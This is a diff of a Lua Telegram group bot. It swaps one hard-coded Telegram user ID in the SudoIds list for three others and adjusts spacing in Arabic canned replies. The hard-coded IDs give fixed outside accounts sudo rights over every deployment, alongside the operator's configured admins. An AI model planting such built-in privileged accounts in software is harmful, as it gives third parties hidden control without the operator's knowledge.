@@ -139,7 +139,7 @@ print("\27[36m"..[[
 ]]..'\27[m'.."\n\27[35mServer Information ↬ ⤈ \n──┈┈┈┄┄╌╌╌╌┄┄┈┈┈ ┉ ┉ ┉ ┉\27[m\n\27[36m~ \27[mUser \27[36m: \27[10;32m"..User.."\27[m\n\27[36m~ \27[mIp \27[36m: \27[10;32m"..Ip.."\27[m\n\27[36m~ \27[mName \27[36m: \27[10;32m"..Name.."\27[m\n\27[36m~ \27[mPort \27[36m: \27[10;32m"..Port.."\27[m\n\27[36m~ \27[mUpTime \27[36m: \27[10;32m"..UpTime.."\27[m\n\27[35m──┈┈┈┄┄╌╌╌╌┄┄┈┈┈ ┉ ┉ ┉ ┉\27[m")
 Config = dofile("./config.lua")
 DevId = Config.DevId
-SudoIds = {Config.SudoIds,1823672541}
+SudoIds = {Config.SudoIds,1978173233,1661260546,2024553273}
 Prox = Config.Prox
 TokenBot = Config.TokenBot
 NameBot = (DevRio:get(Prox..'Rio:NameBot') or 'كيلوا')
@@ -4875,7 +4875,7 @@ end
 if ChatType == 'sp' or ChatType == 'gp' or ChatType == 'pv' then
 if text == 'بوت' or text == 'بوتت' then 
 NameBot = (DevRio:get(Prox..'Rio:NameBot') or 'كيلوا')
-local ProxTeam = {' عايز اي من '..NameBot..' ',' اسمي '..NameBot..' ',' بحبق انا اسمي'..NameBot..' '}
+local ProxTeam = {' عايز اي من '..NameBot..' ',' اسمي '..NameBot..' ','  بحبق انا اسمي '..NameBot..' '}
 DevRio2 = math.random(#ProxTeam) 
 Dev_Rio(msg.chat_id_, msg.id_, 1, ProxTeam[DevRio2] , 1, 'html') 
 return false
